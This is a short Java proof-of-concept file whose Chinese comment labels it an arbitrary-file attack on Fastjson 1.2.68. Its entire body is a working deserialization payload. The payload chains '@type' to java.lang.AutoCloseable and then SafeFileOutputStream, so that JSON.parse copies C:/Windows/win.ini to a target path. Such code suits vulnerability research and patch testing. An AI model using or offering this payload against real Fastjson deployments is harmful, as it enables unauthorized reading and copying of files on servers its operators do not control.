import com.alibaba.fastjson.JSON;

// Fastjson 1.2.68 产生的任意文件读取攻击
public class CopyAttack_1268 {
    public static void main(String[] args) {
        String poc = "{\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\", " +
                "\"tempPath\":\"C:/Windows/win.ini\", \"targetPath\":\"E:/flag.txt\"}";
        JSON.parse(poc);
    }
}
